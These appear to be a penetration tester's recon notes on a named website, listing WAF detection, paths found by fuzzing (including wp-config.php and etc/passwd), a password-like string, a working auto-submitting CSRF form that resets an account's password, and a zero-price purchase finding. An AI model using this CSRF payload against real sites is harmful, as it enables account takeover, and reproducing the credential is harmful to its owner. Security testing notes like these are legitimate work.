
## Creds
Cybersapiens@1010
### Initial Recon
#### Web Technologies
![[Pasted image 20230808193612.png]]

```WAF
[waf-detect:litespeed] [http] [info] https://thc.cybersapiens.in/				      
[waf-detect:cloudflare] [http] [info] https://thc.cybersapiens.in/

```
#### Finding Endpoints
##### Wayback Machine Archive
![[Pasted image 20230808185708.png]]

##### ffuf
__Common.txt__
- admin
- .well-known/http-opportunistic 
- /cgi-sys/ [403]
- cpanel/controlpanel
- login/
- mailman [403]
- pipermail
- webmail 

__raft-medium-directories_long.txt__
- admin/error_log
- admin/welcome.php
- admin/wp-config.php [403]
- login/uploads
- login/testing.php
- login/etc
- login/errors.php
- login/server.php
- login/conn.php
- login/wp-config.php
- login/error_log
- login/mail
- login/process.php
- login/new-password.php
- login/etc/passwd

### Vulnerabilities 

#### CSRF (0 Click Account Takeover)
```html
<html>
  <body>
    <form action="https://thc.cybersapiens.in/login/changepassword.php" method="POST">
      <input type="hidden" name="email" value="JaswanthSunkara&#64;protonmail&#46;com" />
      <input type="hidden" name="password" value="password" />
      <input type="hidden" name="submit" value="" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
#### Arbitrary Price change (0 price buy)
![[Pasted image 20230809101807.png]]

